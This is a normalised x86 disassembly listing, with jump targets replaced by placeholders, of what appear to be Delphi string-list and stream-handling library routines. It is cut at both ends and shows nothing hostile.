and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_414af4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414b18
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414b3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414be3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_414bc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bcd
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414bf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414434
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_414c74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
sub_414ca4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414d5c
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414cfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4154b4
mov eax [ ebp - 0x8 ]
push eax
push sub_415764
push ebp
call sub_414ca4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414d5c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414df1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414df8
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404098
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404480
jne r-xdata
sub_414e08
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414e04
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
jmp sub_403a2c
sub_414e40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414e88
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405ba4
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414e08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e8f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_414e98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414f70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_414f4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f55
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
sub_414f8c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414fd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404534
call sub_408900
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fd8
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_414fe0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4150eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_40410c
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404164
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150f2
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404098
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404334
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404334
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404334
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404334
mov ebx eax
test ebx ebx
je r-xdata
sub_415108
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415180
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415187
lea eax [ ebp - 0xc ]
call sub_404074
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_415194
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415257
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404594
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_4157f4
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40425c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c314
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41525e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_415268
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41529c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4152cc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416330
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415314
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41531b
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_415320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4153bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_4153a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415e7c
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404164
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153a7
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
sub_4153cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41546d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415474
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_415450
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
sub_41547c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4154b4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415558
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41806c
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_415533
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_417108
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418d0c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41553a
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
sub_415564
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416330
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4155af
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4155b6
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_4155bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415609
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404334
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4160e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415610
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_41561c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4056f8
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415650
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415693
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41569a
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4156a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415754
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor edx edx
push ebp
push sub_415737
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41573e
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404164
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_415764
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4157da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4198b8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4198c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4157e1
lea eax [ ebp - 0xc ]
call sub_404074
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419960
inc esi
dec ebx
jne r-xdata
sub_41580c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415828
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414ac4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404afc
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_415890
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414e40
jmp r-xdata
sub_41592c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404afc
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41596c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404be8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_4159d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414e40
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_415a34
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415a34
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_415a58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415ad0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_4040c8
pop edi
pop esi
pop ebx
retn
sub_415b0c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414e40
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_415b34
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_415b68
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_415108
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415bb4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
